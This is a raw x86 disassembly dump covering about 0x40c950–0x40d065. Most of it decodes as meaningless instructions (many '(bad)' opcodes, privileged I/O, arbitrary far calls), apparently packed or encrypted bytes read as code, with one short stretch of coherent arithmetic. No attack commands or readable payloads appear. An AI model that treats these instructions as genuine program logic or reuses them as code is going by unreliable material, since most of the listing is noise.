  40c950:	and    eax,DWORD PTR [esp+ecx*2+0x813edc1]
  40c957:	jae    0x40c916
  40c959:	ins    BYTE PTR es:[edi],dx
  40c95a:	and    ebp,edi
  40c95c:	fs das 
  40c95e:	leave  
  40c95f:	(bad)  
  40c961:	cmp    ebx,DWORD PTR [ebp+0x10]
  40c964:	imul   DWORD PTR [ebx-0x72]
  40c967:	sub    ah,0x67
  40c96a:	dec    ebx
  40c96b:	and    al,0xc9
  40c96d:	stos   BYTE PTR es:[edi],al
  40c96e:	shr    DWORD PTR [edx+0x2b],1
  40c971:	cld    
  40c972:	aas    
  40c973:	imul   ch
  40c975:	cmp    DWORD PTR [edx],ecx
  40c977:	inc    ecx
  40c978:	mov    ebp,0x19ccb22f
  40c97d:	enter  0x4d,0xfe
  40c981:	(bad)  
  40c982:	fs jg  0x40c994
  40c985:	jae    0x40ca04
  40c987:	pop    ebp
  40c988:	ficom  WORD PTR [edi]
  40c98a:	pusha  
  40c98b:	fist   DWORD PTR [eax]
  40c98d:	in     eax,0x48
  40c98f:	fisub  WORD PTR [ebp+0xafe2036]
  40c995:	in     al,0xe
  40c997:	dec    ecx
  40c998:	pop    es
  40c999:	test   eax,0xebb424c3
  40c99e:	div    BYTE PTR [ebx]
  40c9a0:	and    DWORD PTR [edx],esp
  40c9a2:	stc    
  40c9a3:	mov    dh,BYTE PTR ds:0xe1dea582
  40c9a9:	cld    
  40c9aa:	mov    esp,DWORD PTR [ebx]
  40c9ac:	jmp    0x4fda:0x27b202cc
  40c9b3:	call   0x4237:0x546d6fb0
  40c9ba:	jmp    0xf6cc3840
  40c9bf:	xchg   ebp,eax
  40c9c0:	dec    esp
  40c9c1:	sbb    DWORD PTR [ebx-0x4c],0x9cf5bb3c
  40c9c8:	and    BYTE PTR ds:0xc05284e6,ah
  40c9ce:	ret    
  40c9cf:	adc    ebx,DWORD PTR [ecx+0x7790c84c]
  40c9d5:	push   ebx
  40c9d6:	dec    eax
  40c9d7:	out    0xcb,al
  40c9d9:	push   ecx
  40c9da:	nop
  40c9db:	in     eax,0xa6
  40c9dd:	(bad)  
  40c9de:	je     0x40ca12
  40c9e0:	mov    eax,0x35fedc18
  40c9e5:	dec    ecx
  40c9e6:	jle    0x40c9c4
  40c9e8:	jg     0x40c977
  40c9ea:	push   ecx
  40c9eb:	pop    ecx
  40c9ec:	xlat   BYTE PTR ds:[ebx]
  40c9ed:	pop    esp
  40c9ee:	test   eax,0x1df2d6ed
  40c9f3:	jle    0x40ca35
  40c9f5:	call   0xe737:0x21da37e2
  40c9fc:	addr16 mov ah,0xcb
  40c9ff:	div    BYTE PTR ss:[edi]
  40ca02:	push   0xffffffec
  40ca04:	ret    
  40ca05:	int3   
  40ca06:	mov    ds:0xc2ab2d9b,eax
  40ca0b:	(bad)  
  40ca0c:	stc    
  40ca0d:	cmp    al,0x6
  40ca0f:	scas   eax,DWORD PTR es:[edi]
  40ca10:	mov    esi,0x3f0acb7d
  40ca15:	cdq    
  40ca16:	(bad)  
  40ca17:	mov    ebp,0xa3a9ba81
  40ca1c:	pop    ebx
  40ca1d:	dec    ebx
  40ca1e:	add    dl,BYTE PTR [ecx-0x4c]
  40ca21:	jecxz  0x40ca06
  40ca23:	push   ds
  40ca24:	fistp  WORD PTR [esi+0x5c]
  40ca27:	pop    eax
  40ca28:	loopne 0x40ca46
  40ca2a:	jecxz  0x40caa1
  40ca2c:	in     eax,dx
  40ca2d:	mov    ah,0xec
  40ca2f:	or     al,BYTE PTR [ebp+0x36]
  40ca32:	fnstenv [ebx]
  40ca34:	in     al,0xed
  40ca36:	std    
  40ca37:	lock iret 
  40ca39:	inc    ebx
  40ca3a:	test   BYTE PTR [esi],al
  40ca3c:	stos   BYTE PTR es:[edi],al
  40ca3d:	into   
  40ca3e:	inc    ebx
  40ca3f:	add    DWORD PTR [ebx-0x19],edx
  40ca42:	cmp    al,0x70
  40ca44:	daa    
  40ca45:	or     al,0xee
  40ca47:	imul   eax,DWORD PTR [ebp+0x71],0xffffffef
  40ca4b:	pop    esp
  40ca4c:	pop    edi
  40ca4d:	rol    bh,cl
  40ca4f:	xor    BYTE PTR [ebp+0x2f],dh
  40ca52:	mov    al,ds:0xb775a0fd
  40ca57:	fwait
  40ca58:	pop    esp
  40ca59:	dec    esi
  40ca5a:	add    al,0x49
  40ca5c:	adc    ch,ch
  40ca5e:	inc    ebp
  40ca5f:	ffreep st(2)
  40ca61:	push   esp
  40ca62:	mov    edx,0x8d8f8582
  40ca67:	cmp    ebp,DWORD PTR [eax-0xc]
  40ca6a:	and    BYTE PTR [ecx+0x6b2965f2],ah
  40ca70:	(bad)  
  40ca71:	fs jg  0x40ca6e
  40ca74:	jnp    0x40ca29
  40ca76:	test   BYTE PTR [eax],dl
  40ca78:	jge    0x40ca5d
  40ca7a:	mov    edi,DWORD PTR [ecx-0x42]
  40ca7d:	push   ebx
  40ca7e:	cmp    eax,DWORD PTR [ecx+0x2c]
  40ca81:	lea    ebp,[edi]
  40ca83:	or     ecx,ecx
  40ca85:	sub    BYTE PTR [esi+0x234665ed],ch
  40ca8b:	fld    DWORD PTR [edi]
  40ca8d:	stc    
  40ca8e:	mov    BYTE PTR [edi],0x5f
  40ca91:	sub    al,0xe7
  40ca93:	leave  
  40ca94:	aad    0x94
  40ca96:	push   ebp
  40ca97:	push   esp
  40ca98:	or     BYTE PTR [edx],bh
  40ca9a:	in     al,0x36
  40ca9c:	jmp    DWORD PTR [esi-0x4d]
  40ca9f:	outs   dx,BYTE PTR ds:[esi]
  40caa0:	mov    DWORD PTR [edx+esi*1-0x21395499],ebp
  40caa7:	mov    WORD PTR [esi+0x7b46b937],ss
  40caad:	mov    ebp,0x40e28b7c
  40cab2:	rcl    ebp,cl
  40cab4:	into   
  40cab5:	test   al,0xf5
  40cab7:	dec    ebx
  40cab8:	int    0x63
  40caba:	repnz into 
  40cabc:	push   ss
  40cabd:	ficom  DWORD PTR [ecx]
  40cabf:	xchg   edi,eax
  40cac0:	in     eax,dx
  40cac1:	mov    BYTE PTR [ecx-0x193b314c],dl
  40cac7:	jecxz  0x40caa5
  40cac9:	neg    BYTE PTR [ebp+edi*2+0x37]
  40cacd:	xchg   DWORD PTR [esp+eiz*8-0x65],ebp
  40cad1:	aam    0xa0
  40cad3:	sahf   
  40cad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cad5:	pop    edx
  40cad6:	add    al,0x6b
  40cad8:	dec    esi
  40cad9:	pusha  
  40cada:	ins    DWORD PTR es:[edi],dx
  40cadb:	in     al,0x23
  40cadd:	int3   
  40cade:	cdq    
  40cadf:	dec    esi
  40cae0:	mov    ebp,0x7702e9c7
  40cae5:	es (bad) 
  40cae7:	scas   al,BYTE PTR es:[edi]
  40cae8:	iret   
  40cae9:	(bad)  
  40caec:	cdq    
  40caed:	jo     0x40caaa
  40caef:	adc    BYTE PTR [eax-0x3e],dh
  40caf2:	inc    edx
  40caf3:	dec    ecx
  40caf4:	ins    BYTE PTR es:[edi],dx
  40caf5:	lahf   
  40caf6:	loopne 0x40cab3
  40caf8:	lahf   
  40caf9:	vmwrite edx,DWORD PTR [edi]
  40cafc:	mov    ah,dh
  40cafe:	xlat   BYTE PTR ds:[ebx]
  40caff:	add    dl,BYTE PTR [edi+0x4e]
  40cb02:	mov    edx,0x663b4e51
  40cb07:	dec    esi
  40cb08:	mov    ecx,0xd7e6eb9e
  40cb0d:	aas    
  40cb0e:	das    
  40cb0f:	mov    BYTE PTR [ebx],bl
  40cb11:	call   0xa0ce39e9
  40cb16:	cld    
  40cb17:	xor    eax,0x4327334f
  40cb1c:	fwait
  40cb1d:	ins    DWORD PTR es:[edi],dx
  40cb1e:	mov    al,ds:0x5c574112
  40cb23:	mov    ah,0xe2
  40cb25:	sub    BYTE PTR [ecx-0x3d],cl
  40cb28:	xor    bh,ch
  40cb2a:	outs   dx,DWORD PTR ds:[esi]
  40cb2b:	stos   DWORD PTR es:[edi],eax
  40cb2c:	adc    ebx,DWORD PTR [eax*8+0x37278281]
  40cb33:	inc    edx
  40cb34:	rcl    BYTE PTR [edi+0x7f0d5a2b],0x6b
  40cb3b:	pop    esi
  40cb3c:	push   ebx
  40cb3d:	sub    eax,DWORD PTR [ebx+0x4d1dd1f]
  40cb43:	fs int 0xcd
  40cb46:	xchg   esp,esi
  40cb48:	fdivr  DWORD PTR [eax-0x3572f51a]
  40cb4e:	scas   eax,DWORD PTR es:[edi]
  40cb4f:	cmp    dl,BYTE PTR [ebp+0x2f72b4eb]
  40cb55:	imul   esp,DWORD PTR [esi],0xfc1dac95
  40cb5b:	xor    bl,ch
  40cb5d:	mov    eax,ds:0xf4c18f5d
  40cb62:	mov    esp,0x4d1038d5
  40cb67:	sub    BYTE PTR [ebp-0x1e],dl
  40cb6a:	or     DWORD PTR [ebp+0x674cc2e8],ebp
  40cb70:	jge    0x40cb24
  40cb72:	ret    
  40cb73:	xor    al,al
  40cb75:	scas   al,BYTE PTR es:[edi]
  40cb76:	sti    
  40cb77:	cdq    
  40cb78:	mov    esp,DWORD PTR [ecx]
  40cb7a:	clc    
  40cb7b:	sbb    cl,cl
  40cb7d:	je     0x40cba8
  40cb7f:	mov    cl,0x36
  40cb81:	dec    esi
  40cb82:	mov    esi,0x7920eb59
  40cb87:	stos   DWORD PTR es:[edi],eax
  40cb88:	out    0xb1,eax
  40cb8a:	sbb    BYTE PTR [edi-0x3b],0xb6
  40cb8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb8f:	push   ebx
  40cb90:	mov    eax,ds:0xa2a7ad47
  40cb95:	pop    es
  40cb96:	loop   0x40cbb4
  40cb98:	cmp    ebp,DWORD PTR [edi-0x44]
  40cb9b:	rcr    DWORD PTR [edx+0x73],0xa
  40cb9f:	inc    ebx
  40cba0:	sub    BYTE PTR [edi+0x1],cl
  40cba3:	fs mov bl,0xf6
  40cba6:	clc    
  40cba7:	mov    WORD PTR [esi-0x23],ss
  40cbaa:	pop    edx
  40cbab:	jo     0x40cc0b
  40cbad:	push   cs
  40cbae:	xor    ax,0xd888
  40cbb2:	(bad)  
  40cbb3:	jmp    0x801d544b
  40cbb8:	fnstsw WORD PTR [eax+0x5]
  40cbbb:	test   eax,0x3c0e6e94
  40cbc0:	pop    eax
  40cbc1:	push   edx
  40cbc2:	outs   dx,DWORD PTR ds:[esi]
  40cbc3:	mov    dl,0x47
  40cbc5:	add    dh,bl
  40cbc7:	adc    dl,al
  40cbc9:	stos   DWORD PTR es:[edi],eax
  40cbca:	(bad)  
  40cbcb:	or     ebx,esp
  40cbcd:	dec    ecx
  40cbce:	add    ebp,edx
  40cbd0:	je     0x40cc2c
  40cbd2:	sti    
  40cbd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbd4:	outs   dx,DWORD PTR ds:[esi]
  40cbd5:	mov    edi,0x3367ffd2
  40cbda:	xor    eax,0x6993687
  40cbdf:	fnstenv [eax+0x302fcd3d]
  40cbe5:	outs   dx,BYTE PTR ds:[esi]
  40cbe6:	push   eax
  40cbe7:	repnz pop eax
  40cbe9:	out    dx,eax
  40cbea:	inc    eax
  40cbeb:	mov    ecx,0xb87cddc6
  40cbf0:	jg     0x40cc53
  40cbf2:	lds    edi,FWORD PTR [bx+0x64]
  40cbf6:	jl     0x40cbba
  40cbf8:	int3   
  40cbf9:	enter  0x5e39,0x12
  40cbfd:	and    edi,DWORD PTR [eax+edx*8-0xd644e9e]
  40cc04:	push   ebp
  40cc05:	sbb    eax,0x781a453c
  40cc0a:	sub    DWORD PTR [ebx+ebx*2+0x32],ecx
  40cc0e:	jo     0x40cbd4
  40cc10:	ret    0xb33c
  40cc13:	repz mov ah,0x85
  40cc16:	nop
  40cc17:	fcom   st(0)
  40cc19:	arpl   WORD PTR [edi],si
  40cc1b:	inc    eax
  40cc1c:	(bad)  
  40cc1e:	ins    DWORD PTR es:[edi],dx
  40cc1f:	jmp    FWORD PTR [esi-0x77]
  40cc22:	stos   DWORD PTR es:[edi],eax
  40cc23:	cmp    eax,0x19ff2f7c
  40cc28:	and    dh,BYTE PTR [edx+0x519b25af]
  40cc2e:	lahf   
  40cc2f:	lods   al,BYTE PTR ds:[esi]
  40cc30:	test   al,0x4f
  40cc32:	add    bh,BYTE PTR [eax+esi*1-0x39]
  40cc36:	push   es
  40cc37:	rol    edi,1
  40cc39:	outs   dx,BYTE PTR ds:[esi]
  40cc3a:	xchg   edi,eax
  40cc3b:	loopne 0x40cc29
  40cc3d:	lock adc eax,0xca9577f
  40cc43:	stos   DWORD PTR es:[edi],eax
  40cc44:	fld    TBYTE PTR [ebp-0x21be5ac3]
  40cc4a:	adc    esp,DWORD PTR [esi+0x52]
  40cc4d:	jb     0x40cbf7
  40cc4f:	dec    esp
  40cc50:	cmp    eax,0xab13f701
  40cc55:	jb     0x40ccd3
  40cc57:	(bad)  
  40cc58:	aaa    
  40cc59:	shr    BYTE PTR ds:0xb5cb5544,0x9d
  40cc60:	push   di
  40cc62:	rcl    BYTE PTR [edi],cl
  40cc64:	push   eax
  40cc65:	mov    cl,0x6d
  40cc67:	fcomi  st,st(7)
  40cc69:	xchg   esi,eax
  40cc6a:	pop    ss
  40cc6b:	jno    0x40cbfb
  40cc6d:	addr16 ret 
  40cc6f:	bound  esi,QWORD PTR [esi]
  40cc71:	mov    ah,BYTE PTR [ebx+0x11]
  40cc74:	cli    
  40cc75:	mov    esi,0x29d92b00
  40cc7a:	dec    esi
  40cc7b:	mov    esp,0xe95c89fe
  40cc80:	adc    dl,BYTE PTR [edi]
  40cc82:	fimul  WORD PTR [ebx+eiz*1+0x3aa01e60]
  40cc89:	pop    es
  40cc8a:	stc    
  40cc8b:	ror    al,1
  40cc8d:	or     DWORD PTR [eax],ecx
  40cc8f:	cmp    al,0xc6
  40cc91:	push   0x55
  40cc93:	pop    esp
  40cc94:	mov    ebx,0x54e7314a
  40cc99:	push   esi
  40cc9a:	clc    
  40cc9b:	xchg   esp,eax
  40cc9c:	xchg   DWORD PTR [ecx+0x3873185a],esi
  40cca2:	dec    esp
  40cca3:	cs stc 
  40cca5:	test   BYTE PTR [ebx],ah
  40cca7:	cmc    
  40cca8:	mov    edi,0xba415c01
  40ccad:	mov    edi,0xb3b5d042
  40ccb2:	pop    esi
  40ccb3:	xor    DWORD PTR [eax],esi
  40ccb5:	(bad)  
  40ccb6:	daa    
  40ccb7:	retf   0x21b3
  40ccba:	mov    ds:0xe831f83b,al
  40ccbf:	aad    0x66
  40ccc1:	mov    ebp,0x336ac287
  40ccc6:	clc    
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	adc    ebp,0xffffffe1
  40cd18:	add    edx,DWORD PTR [edi+0x7070900b]
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd9e
  40cd23:	mov    ebp,0xdb46e435
  40cd28:	in     eax,0x7d
  40cd2a:	ds mov al,0x7d
  40cd2d:	pusha  
  40cd2e:	mov    ds:0x3c7e3a64,al
  40cd33:	ret    0xce67
  40cd36:	mov    cl,0x5b
  40cd38:	add    bh,0x75
  40cd3b:	pop    esi
  40cd3c:	inc    ebp
  40cd3d:	push   edx
  40cd3e:	nop
  40cd3f:	in     al,0x76
  40cd41:	mov    ds:0xd75791e3,eax
  40cd46:	and    edi,ecx
  40cd48:	cld    
  40cd49:	ins    DWORD PTR es:[edi],dx
  40cd4a:	pushf  
  40cd4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd4c:	jnp    0x40ccd9
  40cd4e:	xchg   edi,eax
  40cd4f:	stos   DWORD PTR es:[edi],eax
  40cd50:	ds bswap ebx
  40cd53:	add    al,bh
  40cd55:	mov    edi,0x6ff931ca
  40cd5a:	mov    dh,0xc8
  40cd5c:	xchg   BYTE PTR [eax-0x26aaa6be],ah
  40cd62:	jns    0x40cde3
  40cd64:	add    BYTE PTR [edx],bl
  40cd66:	add    edi,esp
  40cd68:	ja     0x40cdcb
  40cd6a:	in     eax,0x72
  40cd6c:	xlat   BYTE PTR ds:[ebx]
  40cd6d:	jle    0x40cdc5
  40cd6f:	(bad)  
  40cd71:	push   0x5462e935
  40cd76:	es lahf 
  40cd78:	dec    ebx
  40cd79:	jns    0x40cdcd
  40cd7b:	fs int 0x4
  40cd7e:	nop
  40cd7f:	jno    0x40cdd2
  40cd81:	push   esi
  40cd82:	rol    ah,0xcf
  40cd85:	or     eax,0x3f42d577
  40cd8a:	xchg   ecx,eax
  40cd8b:	loop   0x40cd2b
  40cd8d:	pop    ss
  40cd8e:	push   ecx
  40cd8f:	or     ebx,eax
  40cd91:	jecxz  0x40cde4
  40cd93:	pop    ebx
  40cd94:	test   eax,0x291af7a5
  40cd99:	repz dec edx
  40cd9b:	pop    edx
  40cd9c:	dec    ebp
  40cd9d:	xchg   esp,eax
  40cd9e:	sub    edx,DWORD PTR [edx+0x7e3c89b6]
  40cda4:	mov    al,0xdd
  40cda6:	int    0x21
  40cda8:	ja     0x40cd2e
  40cdaa:	push   es
  40cdab:	dec    ecx
  40cdac:	or     dl,BYTE PTR [edi]
  40cdae:	lds    esp,FWORD PTR [esi+0x2b6c786f]
  40cdb4:	cs cmp ebp,ebx
  40cdb7:	dec    edi
  40cdb8:	(bad)  
  40cdb9:	mov    dh,bh
  40cdbb:	fwait
  40cdbc:	sub    DWORD PTR [edi-0x17],edx
  40cdbf:	pop    ds
  40cdc0:	cld    
  40cdc1:	mov    eax,ds:0x41c8d23c
  40cdc6:	sub    DWORD PTR [edx+ecx*8-0x4e],ecx
  40cdca:	mov    BYTE PTR ds:0x845b8a24,bl
  40cdd0:	shr    DWORD PTR [edx+esi*8-0x622f8a2b],0x32
  40cdd8:	test   eax,0xb6df3d25
  40cddd:	retf   0xec1e
  40cde0:	shl    DWORD PTR [ecx-0x16fa10c3],0xa0
  40cde7:	cmp    BYTE PTR [edi],dh
  40cde9:	dec    edx
  40cdea:	push   ss
  40cdeb:	push   edi
  40cdec:	mov    DWORD PTR [edi],ebx
  40cdee:	ja     0x40ce16
  40cdf0:	in     eax,dx
  40cdf1:	inc    ebx
  40cdf2:	shr    BYTE PTR [ebx],cl
  40cdf4:	cmp    ch,ch
  40cdf6:	cmp    ah,BYTE PTR [ebx]
  40cdf8:	mov    ch,0x2c
  40cdfa:	aaa    
  40cdfb:	xor    esp,eax
  40cdfd:	ja     0x1c73046
  40ce03:	in     eax,0xa8
  40ce05:	add    ebx,DWORD PTR [ebx+0x6e2cc380]
  40ce0b:	sub    BYTE PTR [ebx-0x66240bfa],dl
  40ce11:	out    0x4,eax
  40ce13:	jbe    0x40ce12
  40ce15:	push   esi
  40ce16:	out    0xb8,al
  40ce18:	in     eax,dx
  40ce19:	loopne 0x40ce81
  40ce1b:	hlt    
  40ce1c:	pop    ecx
  40ce1d:	retf   
  40ce1e:	ins    DWORD PTR es:[edi],dx
  40ce1f:	jge    0x40ce52
  40ce21:	pop    ecx
  40ce22:	scas   eax,DWORD PTR es:[edi]
  40ce23:	pusha  
  40ce24:	mov    cs,WORD PTR [eax+0x3]
  40ce27:	pop    esi
  40ce28:	mov    esi,0x3bee6dec
  40ce2d:	outs   dx,BYTE PTR ds:[esi]
  40ce2e:	cmp    cl,BYTE PTR [ebx-0x12]
  40ce31:	lock or ah,dh
  40ce34:	fwait
  40ce35:	pop    eax
  40ce36:	sub    BYTE PTR [ebx-0x48],dl
  40ce39:	aaa    
  40ce3a:	push   ebp
  40ce3b:	ret    
  40ce3c:	std    
  40ce3d:	sbb    al,0x66
  40ce3f:	push   ds
  40ce40:	push   cs
  40ce41:	fist   WORD PTR [ebx]
  40ce43:	shl    BYTE PTR [ebx+eax*2-0x76],1
  40ce47:	lock pusha 
  40ce49:	adc    BYTE PTR [eax+esi*2-0x7b17e787],ah
  40ce50:	push   ebp
  40ce51:	das    
  40ce52:	rcl    BYTE PTR [ecx],1
  40ce54:	nop
  40ce55:	dec    eax
  40ce56:	xchg   esp,eax
  40ce57:	inc    esp
  40ce58:	aad    0x10
  40ce5a:	rol    BYTE PTR [ebp-0x3a41b15a],cl
  40ce60:	test   al,0x30
  40ce62:	sub    al,0xc7
  40ce64:	xor    DWORD PTR [eax-0x433f4a6c],edi
  40ce6a:	inc    ebp
  40ce6b:	and    DWORD PTR [esi+0x4a],esi
  40ce6e:	cmp    eax,0xd1a341f5
  40ce73:	es (bad) 
  40ce75:	repnz pop edi
  40ce77:	ror    BYTE PTR [edi+ecx*1-0x4edc799a],0x62
  40ce7f:	lea    ebx,[edi]
  40ce81:	les    ebx,FWORD PTR [ebp-0x2de54029]
  40ce87:	or     BYTE PTR [ecx+0xb494fe4],dl
  40ce8d:	and    ebx,0x70a2bce3
  40ce93:	outs   dx,BYTE PTR ds:[esi]
  40ce94:	mov    eax,0xeedfe5b1
  40ce99:	jo     0x40ce8c
  40ce9b:	mov    ch,0x7a
  40ce9d:	je     0x40ce36
  40ce9f:	add    edx,DWORD PTR [ebx+0x68]
  40cea2:	pop    esi
  40cea3:	fadd   DWORD PTR [ebx]
  40cea5:	pop    ecx
  40cea6:	addr16 pop ds
  40cea8:	pop    eax
  40cea9:	add    DWORD PTR [ecx],eax
  40ceab:	sub    ebp,eax
  40cead:	iret   
  40ceae:	mov    edx,0x76af3e01
  40ceb3:	jo     0x40ce77
  40ceb5:	loopne 0x40cf10
  40ceb7:	pop    edx
  40ceb8:	out    0xb5,eax
  40ceba:	loop   0x40ce6a
  40cebc:	sbb    eax,0x7d106c47
  40cec1:	xor    BYTE PTR [eax+0x45],al
  40cec4:	jno    0x40cebe
  40cec6:	lods   al,BYTE PTR ds:[esi]
  40cec7:	mov    ss,WORD PTR [esi]
  40cec9:	call   0xedc4a619
  40cece:	mov    BYTE PTR [ecx],dl
  40ced0:	outs   dx,BYTE PTR ds:[esi]
  40ced1:	jns    0x40cf2c
  40ced3:	lds    esp,FWORD PTR [ebx+0x74]
  40ced6:	data16 int 0xf8
  40ced9:	jg     0x40cf4c
  40cedb:	mov    ds:0xc6001fbc,al
  40cee0:	out    dx,al
  40cee1:	jae    0x40ce96
  40cee3:	adc    ecx,ecx
  40cee5:	xor    bh,BYTE PTR [esi+0x6fb33501]
  40ceeb:	push   0xffffff87
  40ceed:	add    al,0x95
  40ceef:	push   ebp
  40cef0:	sub    bh,dl
  40cef2:	aad    0xad
  40cef4:	cmp    esi,DWORD PTR [ecx-0x744b2607]
  40cefa:	js     0x40ce8e
  40cefc:	ficomp WORD PTR [edx]
  40cefe:	sbb    DWORD PTR [esi],0x272b9b44
  40cf04:	sub    esp,DWORD PTR [ebx+0x26da7809]
  40cf0a:	gs test eax,0xcc80324f
  40cf10:	mov    edi,0x7ff10f17
  40cf15:	fadd   st,st(1)
  40cf17:	sub    ebp,DWORD PTR [esi]
  40cf19:	out    dx,eax
  40cf1a:	inc    edi
  40cf1b:	fcmovbe st,st(1)
  40cf1d:	xor    BYTE PTR [edx+ecx*1-0x23908c65],cl
  40cf24:	into   
  40cf25:	xchg   esi,eax
  40cf26:	(bad)  
  40cf27:	ins    DWORD PTR es:[edi],dx
  40cf28:	mov    edx,0xffdd297
  40cf2d:	dec    ebp
  40cf2e:	push   ebx
  40cf2f:	hlt    
  40cf30:	mov    edx,edi
  40cf32:	xchg   esi,eax
  40cf33:	xlat   BYTE PTR ds:[ebx]
  40cf34:	cmp    al,0x81
  40cf36:	mov    bh,bh
  40cf38:	mov    ds:0x7da8c361,al
  40cf3d:	les    ebp,FWORD PTR [esi-0x68]
  40cf40:	lods   al,BYTE PTR ds:[esi]
  40cf41:	sbb    edx,DWORD PTR [edx]
  40cf43:	or     DWORD PTR [eax],ebp
  40cf45:	dec    eax
  40cf46:	xor    eax,0x4175c383
  40cf4b:	cmc    
  40cf4c:	xlat   BYTE PTR ds:[ebx]
  40cf4d:	arpl   WORD PTR ds:0x4da09778,di
  40cf53:	cdq    
  40cf54:	xor    DWORD PTR [edi],edi
  40cf56:	sub    DWORD PTR [ebp+ebx*8-0x76],ebp
  40cf5a:	xchg   esi,eax
  40cf5b:	add    eax,0xad0412d1
  40cf60:	lds    ebp,FWORD PTR [esi-0x39]
  40cf63:	inc    esp
  40cf64:	loopne 0x40cf95
  40cf66:	sub    BYTE PTR [ebp+0x59],0x9f
  40cf6a:	xor    BYTE PTR [edx+0x37],dl
  40cf6d:	xor    DWORD PTR [ecx],edi
  40cf6f:	mov    ds:0x332d0733,al
  40cf74:	outs   dx,DWORD PTR ds:[esi]
  40cf75:	xchg   esp,eax
  40cf76:	fidivr WORD PTR [esi]
  40cf78:	not    DWORD PTR [edx-0x5715d3af]
  40cf7e:	clc    
  40cf7f:	loop   0x40cf5f
  40cf81:	adc    al,BYTE PTR [edx]
  40cf83:	popa   
  40cf84:	repnz xor ebp,ebp
  40cf87:	and    al,0xa5
  40cf89:	call   0xa29ebf20
  40cf8e:	outs   dx,BYTE PTR ds:[esi]
  40cf8f:	add    eax,0x5c664cd5
  40cf94:	aad    0x95
  40cf96:	dec    edi
  40cf97:	sti    
  40cf98:	clc    
  40cf99:	push   edx
  40cf9a:	xor    DWORD PTR ss:[edx+eiz*8-0x72],eax
  40cf9f:	shl    BYTE PTR [edx],cl
  40cfa1:	jmp    0x40cf7b
  40cfa3:	cmp    dl,ch
  40cfa5:	lods   eax,DWORD PTR ds:[esi]
  40cfa6:	xlat   BYTE PTR ds:[ebx]
  40cfa7:	js     0x40cf6c
  40cfa9:	dec    edx
  40cfaa:	test   eax,0xe68e3b03
  40cfaf:	push   edx
  40cfb0:	repz cmp eax,0x67461c7
  40cfb6:	dec    eax
  40cfb7:	rol    ebp,1
  40cfb9:	call   0xac7ad81f
  40cfbe:	pusha  
  40cfbf:	pusha  
  40cfc0:	arpl   WORD PTR [edx],di
  40cfc2:	pop    ebx
  40cfc3:	outs   dx,BYTE PTR ds:[esi]
  40cfc4:	(bad)  
  40cfc6:	scas   al,BYTE PTR es:[edi]
  40cfc7:	int3   
  40cfc8:	call   0x96b2:0x21d5440a
  40cfcf:	jnp    0x40cfd3
  40cfd1:	outs   dx,DWORD PTR ds:[esi]
  40cfd2:	mov    WORD PTR [esi+0x6c],es
  40cfd5:	daa    
  40cfd6:	iret   
  40cfd7:	call   0x80ad1b79
  40cfdc:	ins    DWORD PTR es:[edi],dx
  40cfdd:	nop
  40cfde:	mov    dh,0x2f
  40cfe0:	ins    DWORD PTR es:[edi],dx
  40cfe1:	and    al,0xb4
  40cfe3:	lahf   
  40cfe4:	ss mov esi,0xda4cd333
  40cfea:	adc    bl,BYTE PTR [ecx+eax*4]
  40cfed:	adc    dh,ah
  40cfef:	ror    DWORD PTR [ebp+0x12903f03],1
  40cff5:	mov    fs,WORD PTR [ebx-0x2a]
  40cff8:	mov    ah,0x16
  40cffa:	push   eax
  40cffb:	rcl    ebx,1
  40cffd:	out    0xef,al
  40cfff:	iret   
  40d000:	neg    esp
  40d002:	or     DWORD PTR [esi+0x27],edx
  40d005:	mov    eax,0x82bfa705
  40d00a:	std    
  40d00b:	sub    al,0xbf
  40d00d:	sahf   
  40d00e:	lds    esp,FWORD PTR [esi-0x23]
  40d011:	jge    0x40cfeb
  40d013:	pop    ebp
  40d014:	xchg   esi,eax
  40d015:	push   edi
  40d016:	hlt    
  40d017:	mov    edx,DWORD PTR [edx-0x296f7363]
  40d01d:	call   0xee49:0xeada1171
  40d024:	outs   dx,BYTE PTR ds:[esi]
  40d025:	jl     0x40d04a
  40d027:	shr    BYTE PTR [edi+0x1a],cl
  40d02a:	iret   
  40d02b:	push   edx
  40d02c:	sub    DWORD PTR [edx],ebx
  40d02e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d02f:	cmp    eax,0x5c06ff00
  40d034:	jp     0x40d0a8
  40d036:	push   edx
  40d037:	lahf   
  40d038:	push   esi
  40d039:	or     al,0xd3
  40d03b:	xor    BYTE PTR [esi],dh
  40d03d:	nop
  40d03e:	sub    DWORD PTR [ebp+0x73],0x53
  40d042:	repnz daa 
  40d044:	ja     0x40cfd1
  40d046:	add    BYTE PTR ds:0x71e000fa,ah
  40d04c:	mov    dl,0xb1
  40d04e:	pushf  
  40d04f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d050:	add    al,0xd8
  40d052:	ret    0xbbaa
  40d055:	or     bl,BYTE PTR [esi+0x6e68396c]
  40d05b:	fild   WORD PTR [bp+si-0x33b3]
  40d060:	scas   eax,DWORD PTR es:[edi]
  40d061:	and    al,0x58
  40d063:	jne    0x40d0c1
  40d065:	and    ch,dh
